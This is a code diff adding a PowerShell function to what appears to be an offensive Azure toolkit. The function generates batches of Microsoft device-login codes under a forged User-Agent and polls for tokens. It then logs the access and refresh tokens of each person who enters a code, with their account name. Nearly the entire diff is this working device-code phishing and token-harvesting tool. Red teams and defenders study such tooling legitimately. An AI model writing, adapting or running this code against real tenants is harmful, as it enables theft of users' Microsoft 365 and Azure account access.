@@ -255,6 +255,195 @@ function Get-AzureToken {
         }
     }
 }
+
+function Get-AzureTokenMulti {
+    
+    <#
+    .DESCRIPTION
+        Generate a device code to be used at https://www.microsoft.com/devicelogin. Once a user has successfully authenticated, you will be presented with a JSON Web Token JWT in the variable $response.
+    .EXAMPLE
+        Get-AzureToken -Client Substrate
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String[]]
+        [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
+        $Client,
+        [Parameter(Mandatory=$False)]
+        [String]
+        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+        [Parameter(Mandatory=$False)]
+        [String]
+        $Resource = "https://graph.microsoft.com/",
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory=$False)]
+        [String]
+        $CaptureCode,
+        [Parameter(Mandatory=$False)]
+        [String]
+        $LogFile = "TokenLog.log",
+        [Parameter(Mandatory=$False)]
+        [Int]
+        $Count = "10"
+    )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Forge-UserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Forge-UserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Forge-UserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Forge-UserAgent
+	   }
+	}    
+    $Headers=@{}
+    $Headers["User-Agent"] = $UserAgent
+    if($Client -eq "Outlook") {
+
+        $body=@{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://outlook.office365.com/"
+        }
+    }
+    elseif ($Client -eq "Substrate") {
+
+        $body=@{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://substrate.office.com/"
+        }
+    }
+    elseif ($Client -eq "Yammer") {
+
+        $body=@{
+            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =  "https://www.yammer.com/"
+        }
+    }        
+    elseif ($Client -eq "Custom") {
+
+        $body=@{
+            "client_id" = $ClientID
+            "resource" =  $Resource
+        }
+    }
+    elseif ($Client -eq "MSTeams") {
+        
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://api.spaces.skype.com/"   
+        }
+    }
+    elseif ($Client -eq "Graph") {
+        
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://graph.windows.net/"  
+        }
+    }
+    elseif ($Client -eq "MSGraph") {
+        
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://graph.microsoft.com/"  
+        }
+    }
+    elseif ($Client -eq "AzureCoreManagement") {
+        
+        $body = @{
+            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+            "resource" =      "https://management.core.windows.net/"
+        }
+    }
+    elseif ($Client -eq "AzureManagement") {
+        
+        $body = @{
+            "client_id" =     "84070985-06ea-473d-82fe-eb82b4011c9d"
+            "resource" =      "https://management.azure.com/"
+        }
+    }     
+    # Login Process
+    $global:responses = if($responses.Count -eq 0){@()}else{$responses}
+    $DeviceCodes = @{}
+    $ValidCodes = @()
+    for ($i =  1; $i -le $Count; $i++){
+        $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
+        write-output $authResponse
+        $interval = $authResponse.interval
+        $expires =  $authResponse.expires_in
+        $DeviceCodes += @{$authResponse.user_code = $authResponse.device_code}
+    }
+    write-output $DeviceCodes.Keys
+        
+    while($true)
+    {
+        Start-Sleep -Seconds $interval
+        $total += $interval
+
+        if($total -gt $expires)
+        {
+            Write-Error "Timeout occurred"
+            return
+        }
+        foreach ($code in $DeviceCodes.GetEnumerator()){
+            # Try to get the response. Will give 40x while pending so we need to try&catch
+            try
+            {
+                $body=@{
+                    "client_id" =  $ClientID
+                    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+                    "code" =       $code.Value
+                }
+                $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
+            }
+            catch
+            {
+                # This is normal flow, always returns 40x unless successful
+                $details=$_.ErrorDetails.Message | ConvertFrom-Json
+
+                if($details.error -ne "authorization_pending")
+                {
+                    # This is a real error
+                    Write-Output $details.error
+                    Write-Error $details.error_description
+                    continue
+                }
+            }
+
+            # If we got response, all okay!
+            if($response)
+            {
+                $global:responses += $response
+                $DeviceCodes.Remove($code.Key)
+                $ValidCodes += $code.Key
+                $jwt = $response.access_token
+                $target = (Parse-JWTtoken -token $jwt).unique_name
+                write-output "Got a response for code '$($code.Key)' by '$target'!"
+                write-output "Access with `$responses[$($responses.Count -1)]"
+                write-output $response
+                "-------------------- Token - $($code.Key) - $target --------------------" |Out-File -Append $LogFile
+                "Scope: $($response.scope)" | Out-File -Append $LogFile
+                "Resource: $($response.resource)" | Out-File -Append $LogFile
+                "Access Token: $($response.access_token)" | Out-File -Append $LogFile
+                "Refresh Token: $($response.refresh_token)" | Out-File -Append $LogFile
+                $response = $null
+                break
+            }
+        }
+        Write-Output "Status: $($ValidCodes.Count)/$Count"
+    }
+}
 # Refresh Token Functions
 function RefreshTo-SubstrateToken {
     <#
